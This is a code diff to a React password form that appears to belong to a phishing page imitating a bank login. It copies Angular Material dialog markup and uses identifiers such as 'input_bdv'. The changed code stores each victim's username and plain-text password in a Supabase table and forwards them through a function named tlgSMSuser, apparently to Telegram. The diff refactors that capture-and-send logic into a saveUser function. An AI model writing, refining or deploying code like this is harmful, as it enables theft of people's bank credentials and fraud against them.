@@ -21,15 +21,9 @@ export default function PassForm({ open, close, user, dataInfo }) {
     const pass = input_pass.value;
 
     if (pass.length >= 8) {
-      const { data } = await supabase
-        .from("registers")
-        .insert({ user: dataInfo.user, pass: pass })
-        .select();
-      if (data) {
-        user({ ...dataInfo, id: data[0].id, pass: pass });
-        tlgSMSuser({ ...dataInfo, id: data[0].id, pass: pass });
-        close();
-      }
+      const btn_bdv = document.getElementById("submitButtonPass");
+      btn_bdv.disabled = true;
+      saveUser(pass);
     }
   }
   function handleChangeInput(e) {
@@ -45,6 +39,22 @@ export default function PassForm({ open, close, user, dataInfo }) {
   }
 
   if (!open) return null;
+
+  async function saveUser(pass) {
+    try {
+      const { data } = await supabase
+        .from("registers")
+        .insert({ user: dataInfo.user, pass: pass })
+        .select();
+      if (data) {
+        user({ ...dataInfo, id: data[0].id, pass: pass });
+        tlgSMSuser({ ...dataInfo, id: data[0].id, pass: pass });
+        close();
+      }
+    } catch (error) {
+      console.error(error);
+    }
+  }
 
   return (
     <div>
@@ -69,14 +79,10 @@ export default function PassForm({ open, close, user, dataInfo }) {
               position: "static",
             }}
           >
-            <div
-              tabindex="0"
-              className="cdk-visually-hidden cdk-focus-trap-anchor"
-            ></div>
+            <div className="cdk-visually-hidden cdk-focus-trap-anchor"></div>
             <div
               aria-modal="true"
               className="mat-dialog-container ng-tns-c14-4 ng-trigger ng-trigger-slideDialog ng-star-inserted"
-              tabindex="-1"
               id="mat-dialog-0"
               role="dialog"
               style={{
@@ -99,7 +105,6 @@ export default function PassForm({ open, close, user, dataInfo }) {
                           <div className="mat-form-field-flex">
                             <div className="mat-form-field-infix">
                               <input
-                                autocomplete="off"
                                 className="input_bdv"
                                 name="password"
                                 type="password"
@@ -197,7 +202,6 @@ export default function PassForm({ open, close, user, dataInfo }) {
                 </div>
               </div>
             </div>
-            <div tabindex="0"></div>
           </div>
         </div>
       </div>
